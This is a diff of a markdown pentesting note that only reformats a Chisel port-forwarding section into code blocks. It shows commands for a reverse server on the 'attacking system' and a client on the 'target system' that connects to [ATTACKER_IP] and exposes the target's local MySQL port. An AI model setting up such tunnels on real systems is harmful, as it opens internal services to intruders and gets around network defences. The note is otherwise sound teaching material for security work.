@@ -16,12 +16,25 @@ description: >-
 
 ### Forwarding One Port with Chise;
 
-1. On the attacking system: `./chisel server 9000 -reverse`
-2. On the target system: `.\chisel client [ATTACKER_IP]:9000 R:3306:127.0.0.1:3306`
+On the attacking system:
+
+```bash
+./chisel server 9000 -reverse
+```
+
+On the target system:&#x20;
+
+```bash
+.\chisel client [ATTACKER_IP]:9000 R:3306:127.0.0.1:3306
+```
 
 ### Verification
 
-The easiest way to verify if your `Chisel` connection was successful is to run the following command: `ss -lnpt | grep 3306`
+The easiest way to verify if your `Chisel` connection was successful is to run the following command:&#x20;
+
+```bash
+ss -lnpt | grep 3306
+```
 
 ### Interaction
 
